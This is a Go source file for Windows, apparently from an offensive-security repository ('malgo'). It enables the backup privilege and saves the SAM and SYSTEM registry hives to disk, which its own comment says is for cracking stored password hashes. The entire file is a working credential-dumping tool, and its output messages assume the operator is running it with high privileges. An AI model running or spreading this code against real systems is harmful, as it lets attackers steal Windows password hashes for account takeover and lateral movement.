//go:build windows
// +build windows

// Dump the SAM and SYSTEM hives from registry to allow cracking of stored pwd hashes
package main

import (
	"fmt"
	"os"
	"path/filepath"
	"syscall"
	"unsafe"

	"github.com/stavinski/malgo/win32"
)

func enableBackupPriv() bool {
	var (
		handle      syscall.Handle
		res, hToken uintptr
		err         error
		priv        *byte
		luid        win32.LUID
	)
	fmt.Printf("[+] Trying to enable required %v privilege...\n", win32.SE_BACKUP_NAME)

	handle, err = syscall.GetCurrentProcess()
	if handle == syscall.Handle(win32.NULL) || err != nil {
		fmt.Fprintln(os.Stderr, "[!] Failed to get current process handle")
		return false
	}

	res, _, _ = win32.ProcOpenProcessToken.Call(
		uintptr(handle), // ProcessHandle
		uintptr(win32.TOKEN_QUERY|win32.TOKEN_ADJUST_PRIVILEGES), // DesiredAccess
		uintptr(unsafe.Pointer(&hToken)))                         // TokenHandle

	if res == win32.FALSE {
		fmt.Fprintln(os.Stderr, "[!] Failed to open process token.")
		return false
	}

	// release the token handle
	defer win32.ProcCloseHandle.Call(uintptr(hToken))

	// convert to NUL suffixed byte pointer for win32
	priv, _ = syscall.BytePtrFromString(win32.SE_BACKUP_NAME)
	res, _, _ = win32.ProcLookupPrivilegeValueA.Call(
		win32.NULL,                     // lpSystemName
		uintptr(unsafe.Pointer(priv)),  // lpName
		uintptr(unsafe.Pointer(&luid))) // lpLuid

	if res == win32.FALSE {
		fmt.Fprintln(os.Stderr, "[!] Failed to lookup privilege.")
		return false
	}

	// setup the new enabled privilege state for required backup priv
	newState := win32.TOKEN_PRIVILEGES{
		PrivilegeCount: 1,
		Privileges: [1]win32.LUID_AND_ATTRIBUTES{
			{
				Luid:       luid,
				Attributes: win32.SE_PRIVILEGE_ENABLED,
			}}}

	res, _, _ = win32.ProcAdjustTokenPrivileges.Call(
		hToken,                             // TokenHandle
		win32.FALSE,                        // DisableAllPrivileges
		uintptr(unsafe.Pointer(&newState)), // NewState
		win32.NULL,                         // BufferLength
		win32.NULL,                         // PreviousState
		win32.NULL)                         // ReturnLength

	if res == win32.FALSE {
		fmt.Fprintln(os.Stderr, "[!] Failed to adjust privilege")
		return false
	}

	return true
}

func saveRegHive(subKey, saveFile string) bool {
	var (
		lpstrKey, lpstrSaveFile *byte
		hKey, status            uintptr
	)

	// convert to NUL suffixed byte pointers for win32
	lpstrKey, _ = syscall.BytePtrFromString(subKey)
	lpstrSaveFile, _ = syscall.BytePtrFromString(saveFile)

	status, _, _ = win32.ProcRegOpenKeyExA.Call(
		uintptr(win32.HKEY_LOCAL_MACHINE), // hKey
		uintptr(unsafe.Pointer(lpstrKey)), // lpSubKey
		win32.NULL,                        // ulOptions
		uintptr(win32.KEY_READ),           // samDesired
		uintptr(unsafe.Pointer(&hKey)))    // phkResult
	if status != win32.ERROR_SUCCESS {
		fmt.Fprintf(os.Stderr, "[-] Error opening reg key status: %v", status)
		return false
	}

	// release the reg key handle
	defer win32.ProcRegCloseKey.Call(hKey)
	os.Remove(saveFile) // try and remove any existing file, will err if not there but we don't really care

	status, _, _ = win32.ProcRegSaveKeyExA.Call(
		hKey,                                   // hKey
		uintptr(unsafe.Pointer(lpstrSaveFile)), // lpFile,
		win32.NULL,                             // lpSecurityAttributes
		uintptr(win32.REG_NO_COMPRESSION))      // Flags

	return status == win32.ERROR_SUCCESS
}

func usage() {
	fmt.Fprintf(os.Stderr, "usage: %v <dir>\n", os.Args[0])
	os.Exit(1)
}

func main() {
	var (
		saveDir, samPath, systemPath string
	)

	if len(os.Args) < 2 {
		usage()
	}
	saveDir = os.Args[1]

	if !enableBackupPriv() {
		fmt.Fprintf(os.Stderr, "[!] Failed to enable the required %v privilege, are you running as a high privilege user :-/ ?\n", win32.SE_BACKUP_NAME)
		return
	}
	fmt.Printf("[+] %v privilege enabled.\n", win32.SE_BACKUP_NAME)
	samPath = filepath.Join(saveDir, "SAM")
	if !saveRegHive("SAM", samPath) {
		fmt.Fprintf(os.Stderr, "[!] Failed to %v, are you running as a high privilege user :-/ ?\n", samPath)
		return
	}
	fmt.Println("[+] SAM saved to: " + samPath)

	systemPath = filepath.Join(saveDir, "SYSTEM")
	if !saveRegHive("SYSTEM", systemPath) {
		fmt.Fprintf(os.Stderr, "[!] Failed to save %v, are you running as a high privilege user :-/ ?\n", systemPath)
		return
	}
	fmt.Println("[+] SYSTEM saved to: " + systemPath)
}
